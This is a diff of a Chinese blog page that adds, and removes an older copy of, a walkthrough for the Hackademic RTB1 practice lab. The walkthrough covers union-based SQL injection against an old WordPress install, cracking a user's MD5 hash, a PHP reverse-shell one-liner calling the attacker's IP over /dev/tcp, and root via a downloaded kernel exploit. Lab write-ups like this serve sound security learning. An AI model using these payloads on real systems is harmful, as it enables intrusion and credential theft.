@@ -187,6 +187,239 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://acindm.github.io/2023/11/02/Hackdamic%E9%9D%B6%E6%9C%BA/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.png.jpg">
+      <meta itemprop="name" content="">
+      <meta itemprop="description" content="Welcome to the 1/30000 🫧">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="acind の blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2023/11/02/Hackdamic%E9%9D%B6%E6%9C%BA/" class="post-title-link" itemprop="url">Hackdamic靶机</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2023-11-02 13:20:51" itemprop="dateCreated datePublished" datetime="2023-11-02T13:20:51+08:00">2023-11-02</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2024-03-11 23:52:23" itemprop="dateModified" datetime="2024-03-11T23:52:23+08:00">2024-03-11</time>
+              </span>
+
+          <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>1.5k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>6 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h3 id="Hackdamic靶机"><a href="#Hackdamic靶机" class="headerlink" title="Hackdamic靶机"></a><strong>Hackdamic靶机</strong></h3><p>扫描虚拟机</p>
+<img data-src="/2023/11/02/Hackdamic%E9%9D%B6%E6%9C%BA/%E5%9B%BE%E7%89%87157.png" class title="This is an test image">  
+
+<p>编辑虚拟机设置</p>
+<img data-src="/2023/11/02/Hackdamic%E9%9D%B6%E6%9C%BA/%E5%9B%BE%E7%89%87158.png" class title="This is an test image">  
+
+<img data-src="/2023/11/02/Hackdamic%E9%9D%B6%E6%9C%BA/%E5%9B%BE%E7%89%87159.png" class title="This is an test image">  
+
+<img data-src="/2023/11/02/Hackdamic%E9%9D%B6%E6%9C%BA/%E5%9B%BE%E7%89%87160.png" class title="This is an test image">  
+
+<p><strong>信息收集</strong></p>
+<p>Nmap扫描</p>
+<img data-src="/2023/11/02/Hackdamic%E9%9D%B6%E6%9C%BA/%E5%9B%BE%E7%89%87161.png" class title="This is an test image">  
+
+<img data-src="/2023/11/02/Hackdamic%E9%9D%B6%E6%9C%BA/%E5%9B%BE%E7%89%87162.png" class title="This is an test image">  
+
+<img data-src="/2023/11/02/Hackdamic%E9%9D%B6%E6%9C%BA/%E5%9B%BE%E7%89%87163.png" class title="This is an test image">  
+
+
+
+<p>可以看到开放的端口和对应的服务</p>
+<table>
+<thead>
+<tr>
+<th>Port</th>
+<th>service</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>22&#x2F;tcp</td>
+<td>ssh</td>
+</tr>
+<tr>
+<td>80&#x2F;tcp</td>
+<td>web</td>
+</tr>
+</tbody></table>
+<p>Attempt to access port 80</p>
+<p>scan information on web page</p>
+<img data-src="/2023/11/02/Hackdamic%E9%9D%B6%E6%9C%BA/%E5%9B%BE%E7%89%87164.png" class title="This is an test image">  
+
+<p>Plug-in viewing framework</p>
+<p><a target="_blank" rel="noopener" href="http://192.168.182.131/Hackademic_RTB1/?p=%E2%80%99%E2%80%A6%E2%80%99">http://192.168.182.131/Hackademic_RTB1/?p=’…’</a></p>
+<p><a target="_blank" rel="noopener" href="http://192.168.31.162/Hackademic_RTB1/?cat=1">http://192.168.182.131/Hackademic_RTB1&#x2F;?cat&#x3D;1</a></p>
+<p><strong>反弹shell</strong></p>
+<p>使用dirsearch scan</p>
+<img data-src="/2023/11/02/Hackdamic%E9%9D%B6%E6%9C%BA/%E5%9B%BE%E7%89%87165.png" class title="This is an test image">  
+
+<p>没有结果，换一个路径</p>
+<img data-src="/2023/11/02/Hackdamic%E9%9D%B6%E6%9C%BA/%E5%9B%BE%E7%89%87166.png" class title="This is an test image">  
+
+<p>找到后台</p>
+<img data-src="/2023/11/02/Hackdamic%E9%9D%B6%E6%9C%BA/%E5%9B%BE%E7%89%87167.png" class title="This is an test image">  
+
+<p>有两种方法：1. sql注入</p>
+<p>​                       2. 弱密码爆破</p>
+<p>查看网页源代码看看有没有cms的信息</p>
+<img data-src="/2023/11/02/Hackdamic%E9%9D%B6%E6%9C%BA/%E5%9B%BE%E7%89%87168.png" class title="This is an test image">  
+
+<p>我们直接看到这个cms是WordPress的1.5.1.1版本。然后可以searchsploit一下有啥漏洞：</p>
+<img data-src="/2023/11/02/Hackdamic%E9%9D%B6%E6%9C%BA/%E5%9B%BE%E7%89%87169.png" class title="This is an test image">  
+
+<p>重点观察版本匹配的开头两个，说存在<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=SQL%E6%B3%A8%E5%85%A5&spm=1001.2101.3001.7020">SQL注入</a>，因此接下来的渗透重点关注SQL注入</p>
+<p>尝试SQL注入吧，在参数最后加一个引号，把参数改为cat&#x3D;1’</p>
+<img data-src="/2023/11/02/Hackdamic%E9%9D%B6%E6%9C%BA/%E5%9B%BE%E7%89%87170.png" class title="This is an test image">  
+
+<p> 报错了，而且回显了数据库查询语句：SELECT * FROM wp_categories WHERE cat_ID &#x3D; 1\&#39; LIMIT 1</p>
+<p>先尝试获取数据库到底有多少列，通过order by [num]的方法（按照第[num]列排序），只要页面没有出现报错，就说明数据库至少有[num]列。order by 5是的界面如下</p>
+<img data-src="/2023/11/02/Hackdamic%E9%9D%B6%E6%9C%BA/%E5%9B%BE%E7%89%87171.png" class title="This is an test image">  
+
+<p> order by 6时出现了报错，说明数据库中一共有5列数据：</p>
+<img data-src="/2023/11/02/Hackdamic%E9%9D%B6%E6%9C%BA/%E5%9B%BE%E7%89%87172.png" class title="This is an test image">   
+
+<p>接下来用联合查询的方法进行注入，思考SQL查询语句，要保证后台执行我们的联合查询union select语句，只要将cat_ID的值设置为0，这样就无法查询到结果，相当于只执行了union select的语句。如果将url中的参数改为cat&#x3D;0 union select 1,2,3,4,5那么SQL查询语句将会是：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM wp_categories WHERE cat_ID = 0 union select 1,2,3,4,5 LIMIT 1</span><br></pre></td></tr></table></figure>
+
+<p>LIMIT 1限制了只会显示一条结果，由于SELECT * FROM wp_categories WHERE cat_ID &#x3D; 0无法查询到结果，因此相当于只执行了select 1,2,3,4,5 LIMIT 1，界面如下：</p>
+<img data-src="/2023/11/02/Hackdamic%E9%9D%B6%E6%9C%BA/%E5%9B%BE%E7%89%87173.png" class title="This is an test image">   
+
+<p> 此处非常关键，注意上图中引号内的内容变为了2，因此select 1,2,3,4,5这个语句中2的位置可以进行查询，并回显到前端，我们可以把2修改为version()以查询MySQL的版本，这样参数修改为cat &#x3D; 0 union select 1,version(),3,4,5结果如下：</p>
+<img data-src="/2023/11/02/Hackdamic%E9%9D%B6%E6%9C%BA/%E5%9B%BE%E7%89%87174.png" class title="This is an test image">   
+
+<p>回显了版本</p>
+<p>由于WordPress是非常著名的cms，他的配置是固定的，可以Google查到WordPress1.5.1.1对应的数据库结构</p>
+<img data-src="/2023/11/02/Hackdamic%E9%9D%B6%E6%9C%BA/%E5%9B%BE%E7%89%87175.png" class title="This is an test image">   
+
+<p>找到了wordpress 1.5.1版本下存在的表的结构，有一个名为wp_users的表，下面有user_login,user_pass,user_level（用户名，密码，权限）等关心的列</p>
+<img data-src="/2023/11/02/Hackdamic%E9%9D%B6%E6%9C%BA/%E5%9B%BE%E7%89%87176.png" class title="This is an test image">   
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select id,user_login,user_pass,user_level from wp-users</span><br></pre></td></tr></table></figure>
+
+<p>比如可以查询user_login试试cat&#x3D;0 union select 1,user_login,3,4,5 from wp_users</p>
+<img data-src="/2023/11/02/Hackdamic%E9%9D%B6%E6%9C%BA/%E5%9B%BE%E7%89%87177.png" class title="This is an test image">   
+
+<p>成功查到了一天账号GeorgeMiller，但受限于LIMIT 1,我们只看到了这一个用户，此时可以用group_concat函数让一行内显示所有信息：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat=0 union select 1,group_concat(user_login),3,4,5 from wp_users</span><br></pre></td></tr></table></figure>
+
+<img data-src="/2023/11/02/Hackdamic%E9%9D%B6%E6%9C%BA/%E5%9B%BE%E7%89%87178.png" class title="This is an test image">   
+
+<p>把id，user_login，user_pass ，user_level这几个都注入出来</p>
+<img data-src="/2023/11/02/Hackdamic%E9%9D%B6%E6%9C%BA/%E5%9B%BE%E7%89%87179.png" class title="This is an test image">   
+
+<p>可以找到权限级别user_level最高的用户是GeorgeMiller，他的user_level是10，然后我们破解他的密码哈希7cbb3252ba6b7e9c422fac5334d22054</p>
+<img data-src="/2023/11/02/Hackdamic%E9%9D%B6%E6%9C%BA/%E5%9B%BE%E7%89%87180.png" class title="This is an test image">   
+
+<p>很容易得到是md5，然后找个在线网站Decrypt MD5, SHA1, MySQL, NTLM, SHA256, MD5 Email, SHA256 Email, SHA512, Wordpress, Bcrypt hashes for free online破解即可：</p>
+<img data-src="/2023/11/02/Hackdamic%E9%9D%B6%E6%9C%BA/%E5%9B%BE%E7%89%87181.png" class title="This is an test image">    
+
+<p>密码是q1w2e3</p>
+<p>下面通过用户名GeorgeMiller，密码q1w2e3登录WordPress后台</p>
+<img data-src="/2023/11/02/Hackdamic%E9%9D%B6%E6%9C%BA/%E5%9B%BE%E7%89%87182.png" class title="This is an test image">    
+
+<p>设置允许php文件上传</p>
+<img data-src="/2023/11/02/Hackdamic%E9%9D%B6%E6%9C%BA/%E5%9B%BE%E7%89%87183.png" class title="This is an test image">    
+
+<p>设置成功后，我们可以发现菜单中出现了Upload界面，我们可以上传一个反弹shell的php文件，即shell.php，代码如下，其中10.10.10.128是kali的ip，1234是一会接收shell的端口：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php exec(&quot;/bin/bash -c &#x27;bash -i &gt;&amp; /dev/tcp/10.10.10.128/1234 0&gt;&amp;1&#x27;&quot;); ?&gt; </span><br></pre></td></tr></table></figure>
+
+<p>上传成功且路径是&#x2F;wp-content&#x2F;，下面只要开启nc监听，并访问&#x2F;wp-content&#x2F;shell.php即可接收到反弹shell</p>
+<img data-src="/2023/11/02/Hackdamic%E9%9D%B6%E6%9C%BA/%E5%9B%BE%E7%89%87184.png" class title="This is an test image">    
+
+<img data-src="/2023/11/02/Hackdamic%E9%9D%B6%E6%9C%BA/%E5%9B%BE%E7%89%87185.png" class title="This is an test image">    
+
+<img data-src="/2023/11/02/Hackdamic%E9%9D%B6%E6%9C%BA/%E5%9B%BE%E7%89%87186.png" class title="This is an test image">    nc监听成功收到了反弹shell
+
+
+
+<p><strong>最后进行内核提权</strong></p>
+<p>先用python增强shell的交互性：</p>
+<p>python -c “import pty;pty.spawn(‘&#x2F;bin&#x2F;bash’)”</p>
+<p>查看当前用户，是apache，然后查看内核版本，是2.6.31</p>
+<p>用sudo -l查看当前用户权限：需要密码。此路不通</p>
+<img data-src="/2023/11/02/Hackdamic%E9%9D%B6%E6%9C%BA/%E5%9B%BE%E7%89%87187.png" class title="This is an test image">    
+
+<p> 由于22端口的SSH服务没有开放，所以对于提权来说，寻找SSH登录密码是没有意义的，而我们看到的内核版本又比较老旧，因此可采用内核提权的方法。在searchsploit中搜索Linux kernel 2.6.3版本的提权漏洞</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit linux kernel 2.6.3 | grep -i &#x27;Privilege Escalation&#x27; </span><br></pre></td></tr></table></figure>
+
+<img data-src="/2023/11/02/Hackdamic%E9%9D%B6%E6%9C%BA/%E5%9B%BE%E7%89%87188.png" class title="This is an test image">    
+
+<p>尝试15258.c，发现可以提权，过程如下，先把漏洞利用文件下载下来</p>
+<img data-src="/2023/11/02/Hackdamic%E9%9D%B6%E6%9C%BA/%E5%9B%BE%E7%89%87189.png" class title="This is an test image">    
+
+<p>然后把他传到靶机的&#x2F;tmp目录下，先在kali中启动一个http服务：</p>
+<p>php -S 0:80</p>
+<p>然后在靶机&#x2F;tmp目录下wget，把kali中的15285.c下载下来：</p>
+<img data-src="/2023/11/02/Hackdamic%E9%9D%B6%E6%9C%BA/%E5%9B%BE%E7%89%87190.png" class title="This is an test image">    
+
+<p>在靶机中用gcc编译，就直接命名为15285得了</p>
+<img data-src="/2023/11/02/Hackdamic%E9%9D%B6%E6%9C%BA/%E5%9B%BE%E7%89%87191.png" class title="This is an test image">    
+
+<p> 然后直接运行即可提权</p>
+<p>进入&#x2F;root目录，查看key.txt</p>
+<img data-src="/2023/11/02/Hackdamic%E9%9D%B6%E6%9C%BA/%E5%9B%BE%E7%89%87192.png" class title="This is an test image">    
+
+<p>成功拿到flag</p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
     <link itemprop="mainEntityOfPage" href="https://acindm.github.io/2023/10/26/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-1/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -752,199 +985,6 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://acindm.github.io/2023/10/18/Hackdamic%E9%9D%B6%E6%9C%BA/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.png.jpg">
-      <meta itemprop="name" content="">
-      <meta itemprop="description" content="Welcome to the 1/30000 🫧">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="acind の blog">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2023/10/18/Hackdamic%E9%9D%B6%E6%9C%BA/" class="post-title-link" itemprop="url">Hackdamic靶机</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2023-10-18 15:41:58" itemprop="dateCreated datePublished" datetime="2023-10-18T15:41:58+08:00">2023-10-18</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2024-03-11 18:50:24" itemprop="dateModified" datetime="2024-03-11T18:50:24+08:00">2024-03-11</time>
-              </span>
-
-          <br>
-            <span class="post-meta-item" title="本文字数">
-              <span class="post-meta-item-icon">
-                <i class="far fa-file-word"></i>
-              </span>
-                <span class="post-meta-item-text">本文字数：</span>
-              <span>1.2k</span>
-            </span>
-            <span class="post-meta-item" title="阅读时长">
-              <span class="post-meta-item-icon">
-                <i class="far fa-clock"></i>
-              </span>
-                <span class="post-meta-item-text">阅读时长 &asymp;</span>
-              <span>5 分钟</span>
-            </span>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <p><strong>Hackdamic靶机</strong></p>
-<p>靶机操作过程：</p>
-<p>扫描虚拟机：</p>
-<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps77.jpg" alt="img"> </p>
-<p>编辑虚拟机设置：</p>
-<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps78.jpg" alt="img"> </p>
-<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps79.jpg" alt="img"> </p>
-<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps80.jpg" alt="img"> </p>
-<p>信息收集</p>
-<p>Nmap扫描</p>
-<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps81.jpg" alt="img"> </p>
-<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps82.jpg" alt="img"> </p>
-<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps83.jpg" alt="img"> </p>
-<p>可以看到开放的端口和对应的服务</p>
-<table>
-<thead>
-<tr>
-<th>Port</th>
-<th>service</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>22&#x2F;tcp</td>
-<td>ssh</td>
-</tr>
-<tr>
-<td>80&#x2F;tcp</td>
-<td>web</td>
-</tr>
-</tbody></table>
-<p>Attempt to access port 80</p>
-<p>1.3 scan information on web page</p>
-<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps84.jpg" alt="img"> </p>
-<p>1.3.1Plug-in viewing framework</p>
-<p><a target="_blank" rel="noopener" href="http://192.168.182.131/Hackademic_RTB1/?p=%E2%80%99%E2%80%A6%E2%80%99">http://192.168.182.131/Hackademic_RTB1/?p=’…’</a></p>
-<p><a target="_blank" rel="noopener" href="http://192.168.31.162/Hackademic_RTB1/?cat=1">http://192.168.182.131/Hackademic_RTB1&#x2F;?cat&#x3D;1</a></p>
-<p>考反弹shell</p>
-<p>使用dirsearch scan</p>
-<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps85.jpg" alt="img"> </p>
-<p>没有结果，换一个路径</p>
-<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps86.jpg" alt="img"> </p>
-<p>找到后台</p>
-<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps87.jpg" alt="img"> </p>
-<p>有两种方法</p>
-<p>1.sql注入</p>
-<p>2.弱密码爆破</p>
-<p>查看网页源代码看看有没有cms的信息</p>
-<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps88.jpg" alt="img"> </p>
-<p>我们直接看到这个cms是WordPress的1.5.1.1版本。然后可以searchsploit一下有啥漏洞：</p>
-<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps89.jpg" alt="img"> </p>
-<p>重点观察版本匹配的开头两个，说存在<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=SQL%E6%B3%A8%E5%85%A5&spm=1001.2101.3001.7020">SQL注入</a>，因此接下来的渗透重点关注SQL注入</p>
-<p>尝试SQL注入吧，在参数最后加一个引号，把参数改为cat&#x3D;1’</p>
-<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps90.jpg" alt="img"> </p>
-<p> 报错了，而且回显了数据库查询语句：</p>
-<p>SELECT * FROM wp_categories WHERE cat_ID &#x3D; 1\&#39; LIMIT 1</p>
-<p>先尝试获取数据库到底有多少列，通过order by [num]的方法（按照第[num]列排序），只要页面没有出现报错，就说明数据库至少有[num]列。order by 5是的界面如下：</p>
-<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps91.jpg" alt="img"> </p>
-<p> order by 6时出现了报错，说明数据库中一共有5列数据：</p>
-<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps92.jpg" alt="img"> </p>
-<p>接下来用联合查询的方法进行注入，思考SQL查询语句，要保证后台执行我们的联合查询union select语句，只要将cat_ID的值设置为0，这样就无法查询到结果，相当于只执行了union select的语句。如果将url中的参数改为cat&#x3D;0 union select 1,2,3,4,5那么SQL查询语句将会是：</p>
-<p>SELECT * FROM wp_categories WHERE cat_ID &#x3D; 0 union select 1,2,3,4,5 LIMIT 1</p>
-<p>LIMIT 1限制了只会显示一条结果，由于SELECT * FROM wp_categories WHERE cat_ID &#x3D; 0无法查询到结果，因此相当于只执行了select 1,2,3,4,5 LIMIT 1，界面如下：</p>
-<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps93.jpg" alt="img"> </p>
-<p> 此处非常关键，注意上图中引号内的内容变为了2，因此select 1,2,3,4,5这个语句中2的位置可以进行查询，并回显到前端，我们可以把2修改为version()以查询MySQL的版本，这样参数修改为cat &#x3D; 0 union select 1,version(),3,4,5结果如下：</p>
-<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps94.jpg" alt="img"> </p>
-<p>回显了版本</p>
-<p>由于WordPress是非常著名的cms，他的配置是固定的，可以Google查到WordPress1.5.1.1对应的数据库结构</p>
-<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps95.jpg" alt="img"> </p>
-<p>找到了wordpress 1.5.1版本下存在的表的结构，有一个名为wp_users的表，下面有user_login,user_pass,user_level（用户名，密码，权限）等关心的列</p>
-<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps96.jpg" alt="img"> </p>
-<p>select id,user_login,user_pass,user_level from wp-users</p>
-<p>比如可以查询user_login试试cat&#x3D;0 union select 1,user_login,3,4,5 from wp_users</p>
-<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps97.jpg" alt="img"> </p>
-<p>成功查到了一天账号GeorgeMiller，但受限于LIMIT 1,我们只看到了这一个用户，此时可以用group_concat函数让一行内显示所有信息：</p>
-<p>cat&#x3D;0 union select 1,group_concat(user_login),3,4,5 from wp_users</p>
-<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps98.jpg" alt="img"> </p>
-<p>把id，user_login，user_pass ，user_level这几个都注入出来</p>
-<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps99.jpg" alt="img"> </p>
-<p>可以找到权限级别user_level最高的用户是GeorgeMiller，他的user_level是10，然后我们破解他的密码哈希7cbb3252ba6b7e9c422fac5334d22054</p>
-<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps100.jpg" alt="img"> </p>
-<p>很容易得到是md5，然后找个在线网站Decrypt MD5, SHA1, MySQL, NTLM, SHA256, MD5 Email, SHA256 Email, SHA512, Wordpress, Bcrypt hashes for free online破解即可：</p>
-<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps101.jpg" alt="img"> </p>
-<p>密码是q1w2e3</p>
-<p>下面通过用户名GeorgeMiller，密码q1w2e3登录WordPress后台</p>
-<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps102.jpg" alt="img"> </p>
-<p>设置允许php文件上传</p>
-<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps103.jpg" alt="img"> </p>
-<p>设置成功后，我们可以发现菜单中出现了Upload界面，我们可以上传一个反弹shell的php文件，即shell.php，代码如下，其中10.10.10.128是kali的ip，1234是一会接收shell的端口：</p>
-<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.10.128/1234 0>&1'"); ?><p>上传成功且路径是&#x2F;wp-content&#x2F;，下面只要开启nc监听，并访问&#x2F;wp-content&#x2F;shell.php即可接收到反弹shell：</p>
-<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps104.jpg" alt="img"> </p>
-<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps105.jpg" alt="img"> </p>
-<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps106.jpg" alt="img"> nc监听成功收到了反弹shell</p>
-<p><em><strong>*最后进行内核提权*</strong></em></p>
-<p>先用python增强shell的交互性：</p>
-<p>python -c “import pty;pty.spawn(‘&#x2F;bin&#x2F;bash’)”</p>
-<p>查看当前用户：</p>
-<p>是apache，然后查看内核版本，是2.6.31：</p>
-<p>用sudo -l查看当前用户权限：</p>
-<p>很遗憾，需要密码。此路不通。</p>
-<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps107.jpg" alt="img"> </p>
-<p> 由于22端口的SSH服务没有开放，所以对于提权来说，寻找SSH登录密码是没有意义的，而我们看到的内核版本又比较老旧，因此可采用内核提权的方法。在searchsploit中搜索Linux kernel 2.6.3版本的提权漏洞：</p>
-<p>searchsploit linux kernel 2.6.3 | grep -i ‘Privilege Escalation’ </p>
-<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps108.jpg" alt="img"> </p>
-<p>尝试15258.c，发现可以提权，过程如下，先把漏洞利用文件下载下来</p>
-<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps109.jpg" alt="img"> </p>
-<p>然后把他传到靶机的&#x2F;tmp目录下，先在kali中启动一个http服务：</p>
-<p>php -S 0:80</p>
-<p>然后在靶机&#x2F;tmp目录下wget，把kali中的15285.c下载下来：</p>
-<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps110.jpg" alt="img"> </p>
-<p>在靶机中用gcc编译，就直接命名为15285得了</p>
-<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps111.jpg" alt="img"> </p>
-<p> 然后直接运行即可提权</p>
-<p>进入&#x2F;root目录，查看key.txt</p>
-<p><img data-src="file:///C:\Users\lm\AppData\Local\Temp\ksohtml17332\wps112.jpg" alt="img"> </p>
-<p>成功拿到了flag，至此打靶成功</p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
     <link itemprop="mainEntityOfPage" href="https://acindm.github.io/2023/10/18/w1r3s%E9%9D%B6%E5%9C%BA/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1393,7 +1433,7 @@
       <i class="fa fa-coffee"></i>
     </span>
       <span class="post-meta-item-text">站点阅读时长 &asymp;</span>
-    <span title="站点阅读时长">27 分钟</span>
+    <span title="站点阅读时长">29 分钟</span>
 </div>
 
 <!-- <br /> -->
